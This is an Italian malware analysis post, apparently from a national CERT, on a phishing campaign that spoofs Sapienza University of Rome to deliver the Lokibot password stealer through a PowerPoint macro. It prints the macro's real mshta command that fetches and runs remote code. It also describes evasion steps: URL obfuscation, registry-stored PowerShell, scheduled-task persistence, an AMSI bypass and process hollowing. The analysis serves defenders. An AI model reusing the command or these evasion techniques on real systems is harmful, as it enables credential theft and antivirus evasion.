+++
description = "circolazione malware"
title = "Falsa email sapienza"
type = "post"
date = 2020-05-04
+++


I criminali dietro al malware Lokibot, in grado di rubare le password da un lungo elenco di programmi (di cui molti sensibili), nel tentativo di fare quante più vittime possibile, hanno diffuso e-mail che all’apparenza sembrano provienire dall’Università della Sapienza di Roma.

I loghi e i riferimenti inseriti sono contestualizzati in un layout approssimativo, così come il corpo del messaggio.
Questi elementi, unitamente ai riferimenti all’Università di Belgrado inseriti nella parte finale dell’e-mail, sono sufficienti a smascherare la natura malevola del messaggio.
Per rendere più verosimile la comunicazione, la scelta del mittente del messaggio è ricaduta su admin@uniroma1.it, quando in realtà il messaggio risulta inviata da dominio kamarakis.gr.
L’avvio della catena di infezione è demandata ad un documento PowerPoint RICHIEDI OFFERTA 21-7-2020.ppt che effettua, tramite una serie di download, l’esecuzione del malware Lokibot.

L’utilizzo di un documento PowerPoint per veicolare malware è stato visto raramente nel panorama italiano, tuttavia non vi sono motivi tecnici dietro la scelta (i file MS Office presentano lo stesso formato, come contenitori), ma sono da prediligersi i fattori umani: in ambito lavorativo un documento Word o Excel è meno sospetto ad un’amministrazione.
In questa particolare campagna è più utile per i criminali usare un file PowerPoint in quanto spesso usato per le presentazioni di progetti.
Dettagli tecnici

Il documento PowerPoint contiene una macro VBA di semplice interpretazione che si riduce ad eseguire il comando (tramite il metodo Shell di un oggetto Wscript):

mshta https://%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69%69@j.mp/asdxasmxoaoskxosdkasodkaos

Da notare due aspetti:

    Gli URL usati presentano un nome utente (in questo caso si tratta del carattere “i” ripetuto 20 volte), ovvero una stringa variabile seguita da una chiocciola.
    A tutti gli URL è possibile aggiungere una coppia di credenziali date da nome utente e password.
    Tuttavia se la richiesta HTTP non richiede autenticazione, queste sono ignorate dal server.
    Questa tecnica permette agli attaccanti di generare potenzialmente infinite forme diverse del solito URL, aggirando i dispositivi di sicurezza che non normalizzano l’URL prima di decidere se bloccarlo o meno.
    Viene usato lo strumento MSHTA, pensato per eseguire applicazioni HTML, spesso sfruttato dai malware per scaricare ed eseguire il payload.

L’URL indicato riguarda un servizio di URL shortening appartenente a Bitfly e rimanda ad un paste sulla piattaforma pastebin.com.

Il contenuto del paste presenta uno script VBS (mostrato sotto) che ha il compito di:

    Scaricare un’altra applicazione MSHTA da un altro paste e garantirne la persistenza creando un apposito task schedulato ogni sei minuti.
    Garantire la persistenza del malware creando e registrando due script in autorun che scaricano altre applicazioni MSHTA.
    Scaricare una seconda applicazione MSHTA e garantirne la persistenza registrando uno script all’avvio.

In totale vengono usate quattro applicazioni MSHTA.
L’applicazione scaricata al punto 1) non fa altro che eseguire uno script PowerShell, ovviamente per evitare di essere rilevata dagli AV e dall’utente utilizza le seguenti tecniche:

    Salva il contenuto dello script nella chiave di registro HKCU\Software\fucku e lo esegue tramite uno script powershell wrapper che recupera il valore della chiave ed invoca iex (Invoke-Expression).
    Utilizza WMI per creare un processo PowerShell con la finestra nascosta.

Script VBS esegue payload PowerShell

Il payload PowerShell, una volta riformattato è di semplice analisi, il suo compito è quello di scaricare due script (codificati in varianti di dump esadecimali) direttamente dalla piattaforma pastebin.com.
Payload PowerShell riformattato

Gli script hanno una struttura simile: un payload compresso in formato GZIP salvato come dump esadecimale (con caratteri extra per eludere gli antivirus) che viene salvato nella variabile $decompressedByteArray, ed un assembly .NET (sempre compresso) che viene caricato ed eseguito ed ha il compito di bypassare AMSI.

Il payload del primo script è il malware Lokibot, il payload del secondo script è un assembly .NET, già conosciuto (il nome del metodo rOnAlDo.ChRiS è già apparso in letteratura), che ha il compito di eseguire Lokibot tramite Process Hollowing.
AMSI bypass

Il dropper utilizza un assembly .NET per disabilitare AMSI, la tecnologia di Microsoft per la scansione dei malware.

L’assembly è uno strumento noto e in uso presso gli APT, sebbene sia un assembly .NET il codice CIL (managed) presente non è molto indicativo perchè il modulo è offuscato tramite una tecnica che recupera il puntatore a varie funzioni managed del framework .NET che saranno invocate mediante questi puntatori.

A questo si aggiunge una forte offuscazione di tipo control-flow e la presenza di una risorsa binaria con formato sconosciuto.

Con pazienza è comunque possibile analizzare l’assembly, il suo algoritmo è infatti (una volta deoffuscato) molto banale: viene usato uno shellcode (esistente nelle versioni a 32 e 64 bit) che carica la DLL amsi.dll tramite le API di Windows (che sono importante dal TEB) e patcha il metodo AmsiScanBuffer per far ritornare il codice di errore associato ad un parametro non valido.

La stringa di trademark dell’assembly contiene il nome della dll amsi.dll e il nome del metodo AmsiScanBuffer, in modo che questi non compaiono come stringhe nel codice .NET.
Il payload è generato a partire dalla risorsa binaria con varie letture ad offset specifici.

L’assembly che effettua il process hollowing usa una tecnica di offuscazione analoga, oltre al process hollowing, controlla ed interferisce con la presenza di un debugger in un ciclo di un apposito thread.

Indicatori di Compromissione

Si riportano di seguito gli indicatori di compromissione già condivisi tramite le piattaforme CNTI e MISP di Cert-AgID, a tutela delle strutture accreditate.